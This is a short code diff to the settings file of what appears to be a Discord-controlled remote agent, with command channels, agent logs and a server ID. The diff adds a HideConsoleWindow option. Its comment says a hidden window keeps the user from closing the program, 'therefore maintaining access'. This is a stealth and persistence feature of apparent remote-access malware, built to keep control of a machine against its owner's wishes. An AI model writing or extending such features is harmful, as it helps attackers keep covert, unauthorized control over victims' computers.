@@ -23,6 +23,10 @@ package util
 // If set to false, the Bot will archive the agents now-old command channel (#channel -> #archive-channel).
 var DeleteOnExit bool = false
 
+// Whether to hide the applications console window on startup (cross-platform).
+// This is recommended as having no window will prevent the user from closing it, therefore maintaining access.
+var HideConsoleWindow bool = false
+
 // Server to create the agent logs in (I suggest you make the server private).
 var ServerID = "XXXXXXXXXXXXXXXXXXX"
 
